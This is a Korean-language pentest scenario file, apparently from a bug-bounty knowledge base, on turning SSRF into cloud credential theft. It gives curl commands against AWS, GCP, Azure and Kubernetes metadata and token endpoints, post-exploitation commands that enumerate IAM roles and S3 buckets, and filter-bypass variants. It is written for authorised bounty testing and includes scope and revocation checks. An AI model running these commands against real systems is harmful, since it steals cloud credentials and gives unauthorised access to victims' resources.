# Scenario: Cloud IMDS SSRF → Credentials → Privilege Escalation

> `ssrf_to_cloud_rce.md`의 cloud 특화 확장. AWS/GCP/Azure 각 플랫폼 세부 기법.

## 1. Threat Model
- **타겟**: EC2/EKS/ECS/Lambda, GCE/GKE, Azure VM/AKS
- **공격자**: SSRF 보유 (URL fetch, webhook, LLM browse tool 등)
- **Impact**: 클라우드 자격 증명 탈취 → 리소스 접근
- **Severity**: Critical

## 2. Discovery Signals
- 앱이 `169.254.169.254`, `metadata.google.internal` 등에 접근 가능
- IMDSv2 강제 여부 (AWS 2023-11부터 신규 EC2 기본, 기존은 옵션)
- Container: `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 환경변수 여부
- EKS/GKE: IRSA / Workload Identity 설정

## 3. Exploit Chain

### 3.1 AWS EC2 IMDSv1
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → <role-name>
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# → {AccessKeyId, SecretAccessKey, Token, Expiration}
```

### 3.2 AWS IMDSv2 (hop limit bypass)
```
필요 조건: PUT 요청 + 커스텀 헤더 가능한 SSRF
1. PUT /latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds: 21600
2. GET /latest/meta-data/... -H X-aws-ec2-metadata-token: <token>
```
Hop limit 기본 1 → 컨테이너 안에서 호출 시 차단 (hop=2 필요).

### 3.3 AWS ECS/Fargate
```bash
# task role creds
curl "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
```

### 3.4 AWS Lambda
```bash
# runtime API (SSRF로 /proc/self/environ 또는 tmp 파일 읽기)
curl http://localhost:9001/2018-06-01/runtime/invocation/next
# environment에서 AWS_LAMBDA_RUNTIME_API + AWS_ACCESS_KEY_ID 등
```

### 3.5 GCP
```bash
# 필수: Metadata-Flavor 헤더
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### 3.6 Azure
```bash
# api-version 필수
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 3.7 K8s (EKS/GKE/AKS)
```bash
# kubelet (일반적으로 localhost:10250)
curl -k https://localhost:10250/pods
# 서비스 어카운트 토큰
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## 4. Post-exploitation (creds 확보 후)
```bash
# AWS
export AWS_ACCESS_KEY_ID=... SECRET=... TOKEN=...
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws s3 ls  # data exfil 증명

# GCP
curl -H "Authorization: Bearer $TOKEN" \
  https://storage.googleapis.com/storage/v1/b?project=$PROJECT
```

## 5. Evidence Tier
- E1: 실제 creds로 `sts get-caller-identity` 성공 출력 + 최소 1개 리소스 나열 (bucket 이름, DB cluster ARN 등) + creds 즉시 revoke 요청
- E2: metadata 응답 전체 캡처 (role 이름 + creds 필드 블러 처리)
- E3: SSRF 성공만 증명 (내부 IP 응답)

## 6. Gate 1 / Gate 2
- [ ] AWS: IMDSv2 활성 여부 확인 — v2 강제 시 PUT 가능한 SSRF 필요
- [ ] 탈취 creds 사용 범위 최소화 — list 권한까지만, 수정 작업 금지
- [ ] Creds revoke 신속 요청 (bounty 프로그램 협조)
- [ ] 프로그램이 "cloud config 오류"를 in-scope로 명시?

## 7. Variants
- **DNS rebinding to 169.254**
- **Redirect chain** — 공격자 서버 3xx → metadata
- **IPv6 mapped** — `[::ffff:169.254.169.254]`
- **IP 표기 변형** — octal, hex, decimal
- **Unicode/URL 파서 차이** — `http://evil@169.254.169.254/`
- **GCP IAM Workload Identity Federation 탈취**

## 8. References
- Capital One 2019 breach postmortem
- AWS IMDSv2 공식 — https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- HackingTheCloud — https://hackingthe.cloud
- HackTricks Cloud — cloud.hacktricks.xyz
- `knowledge/scenarios/web/ssrf_to_cloud_rce.md` (상위 시나리오)
